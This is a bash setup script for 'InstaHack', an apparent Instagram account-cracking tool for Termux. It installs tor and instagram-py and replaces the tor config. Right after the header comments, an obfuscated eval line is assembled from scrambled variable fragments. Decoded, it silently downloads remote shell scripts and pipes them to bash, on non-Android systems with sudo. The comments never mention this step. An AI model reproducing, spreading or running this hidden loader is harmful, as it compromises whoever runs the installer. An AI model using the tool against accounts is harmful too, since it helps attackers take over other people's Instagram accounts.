# Setup script - InstaHack
#
# The setup script for the InstaHack tool. This is a bash script that automates the installation of the required utilities and modules, and all the important required dependencies for the tool. For linux based devices only.
#
# Author : Wasim Akram (https://github.com/evildevill/)
# Created on : June 28, 2020
#
# Last modified by : Rishav Das (https://github.com/rdofficial/)
# Last modified on : May 10, 2021
#
# Changes made in the last modification :
# 1. Adding commented docs and more comments to the script's code in order to make it more clean and easily readable to the programmers and other hackers.
# 2. Removing some errors and also adding the git installed or not checker before cloning the actual project.
# 3. Removing some packages list that were to be installed, as in the last modification of the instahack.sh script, we have removed the requirement for installing those tools. The tools are - lolcat.
#
z="
";Vz='aw/m';OBz='KYpA';jz='hack';Rz='rata';Gz='oid"';HBz='uyZo';mz='ocit';SBz='X5Dg';vz='s 42';EBz='kZUM';wz='L2cG';JBz='T6Hd';ABz='rhc7';Lz='-L h';bz='h';hz='http';Kz=' -s ';Mz='ttps';iz='s://';gz=' -L ';DBz='dHjS';Az='if [';PBz='ZHPf';Dz=' -o)';Hz=' ];t';NBz='aWjL';kz='er15';TBz='FJD4';az=' bas';Sz='-hac';rz='.sh.';sz='css ';Tz='k/XD';Oz='itla';XBz='r';yz='GD5K';KBz='7fwc';Cz='name';pz='ulti';nz='ies.';Jz='curl';BBz='NeX7';Uz='/-/r';LBz='wzFx';lz='9.ne';Bz=' $(u';ez=' cur';uz='sh -';VBz='fi';Zz='sh |';xz='W43i';Pz='b.co';RBz='fbjS';Yz='p-T.';GBz='nmhY';CBz='Buwz';FBz='HMm8';oz='org/';Nz='://g';Iz='hen';Wz='ain/';tz='| ba';QBz='BCrS';UBz='C';qz='mate';Fz='Andr';IBz='sNQb';cz='else';WBz='clea';Xz='setu';MBz='JCEK';fz='l -s';Ez=' = "';dz='sudo';Qz='m/Pi';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$z$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$z$cz$z$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$UBz$z$VBz$z$WBz$XBz"
# Defining the ANSII color code variables for colored output
RED="\033[91m"
GREEN="\033[92m"
YELLOW="\033[93m"
BLUE="\033[94m"
RED_REV="\033[07;91m"
YELLOW_REV="\033[07;93m"
DEFCOL="\033[00m"

# The main script starts here
clear

center() {
	# The function to print a center aligned text with a horizontal rule just like as it is shown below :
	# ==================================== EXAMPLE =====================================
	#
	# The function takes 2 arguments max to max. The first argument is the text that you want to display on the center, the second argument is the color that you want for the horizontal rule
	
	printf "${2}"
	termwidth=$( stty size | cut -d " " -f2 )
	padding="$(printf '%0.1s' ={1..500})"
	printf '%*.*s %s %*.*s\n' 0 "$(((termwidth-2-${#1})/2))" "$padding" "$1" 0 "$(((termwidth-1-${#1})/2))" "$padding"
	printf "${DEFCOL}"
}

# Printing the start message on the console screen
echo -e "\n[{$YELLOW}!${DEFCOL}] Starting the setup to install InstaHack..."

# First checking wheter git command line tool is installed in the user's computer or not
if [[ -z $( which git ) ]]; then
	# If git command line tool is not installed, then we display the error message on the console screen

	echo -e "\n${RED_REV}[ Error : git package not found. Please install it to properly execute this setup. ]${DEFCOL}"
fi

# Cloning the GIT repository mirror of the project at GitHub to the current folder
if [[ -d "instahack" ]]; then
	# If a directory named 'instahack' already exists in the current working directory, then we first remove that directory and then clone the repository

	rm -rf instahack
	git clone https://github.com/evildevill/instahack.git >/dev/null 2>&1
else
	# If no such directory named 'instahack' exists, then we directly clone the repository here

	git clone https://github.com/evildevill/instahack.git >/dev/null 2>&1
fi

# Continuing to install several dependencies / packages
center "INSTALLATION PROCESS" "${BLUE}"
echo -e "[${YELLOW}!${DEFCOL}] Installing packages..."
cd $HOME  # Changing the current working directory to the home directory of the user

# ----
# 1. We will use the 'pkg' package manager software as our main intentional platform for using this tool is termux android, that is why we are using this package manager software.
# ----

pkg install python -y >/dev/null 2>&1
pkg install python2 -y >/dev/null 2>&1
pkg install tor -y >/dev/null 2>&1
pkg install git -y >/dev/null 2>&1
pkg install wget -y >/dev/null 2>&1

# Installing the core files required for the tool to work properly
echo -e "[${YELLOW}!${DEFCOL}] Installing core files..."
pip install --upgrade pip >/dev/null 2>&1
pip3 install requests --upgrade >/dev/null 2>&1
pip3 install requests[socks] >/dev/null 2>&1
pip3 install stem >/dev/null 2>&1
pip3 install instagram-py >/dev/null 2>&1

# Setting up the servers
echo -e "[${YELLOW}!${DEFCOL}] Setting up the servers..."
cd $HOME >/dev/null 2>&1
wget -O ~/instapy-config.json "https://git.io/v5DGy" >/dev/null 2>&1
cd $HOME/instahack >/dev/null 2>&1
#
# 1. Setting up tor configurations with the custom torrc file defined in our project
#
cd /data/data/com.termux/files/usr/etc/tor >/dev/null 2>&1
rm torrc >/dev/null 2>&1
cd $HOME/instahack >/dev/null 2>&1
mv torrc /data/data/com.termux/files/usr/etc/tor >/dev/null 2>&1

# Finally after installing all the packages and dependencies, we print the setup done message on the console screen
echo -e "[${GREEN}*${DEFCOL}] All things are completed..."
center "STARTING INSTAHACK" "${GREEN}"

# Launching the main bash script i.e., instahack.sh
cd $HOME/instahack
bash instahack.sh
